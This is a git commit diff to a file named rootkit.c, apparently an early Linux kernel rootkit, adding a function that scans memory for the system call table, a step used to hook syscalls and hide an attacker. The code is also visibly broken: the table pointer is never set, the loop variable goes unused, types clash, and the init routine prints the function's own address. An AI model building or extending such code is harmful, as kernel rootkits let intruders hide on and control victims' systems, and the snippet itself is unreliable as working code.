0cd3a6fe99bd36d3d9e0556af158fe1d46426d5d
Pedro Peck <pedrop.peck@gmail.com>
2020-06-07 21:18:47 +0300

    Add get_syscall_table function.

--- rootkit.c
+++ rootkit.c
@@ -2,9 +2,20 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 
+static unsigned long int get_syscall_table(void)
+{
+    unsigned long *sys_call_table;
+    unsigned long int i;
+
+    for (i = sys_close; i < ULONG_MAX; i += sizeof(void *))
+        if (sys_call_table[__NR_close] == (unsigned long)sys_close)
+            return sys_call_table;
+    return NULL;
+}
+
 static int __init init_rootkit(void)
 {
-
+    printk(KERN_INFO "%p\n", get_syscall_table);
 }
 
 static void __exit cleanup_rootkit(void)
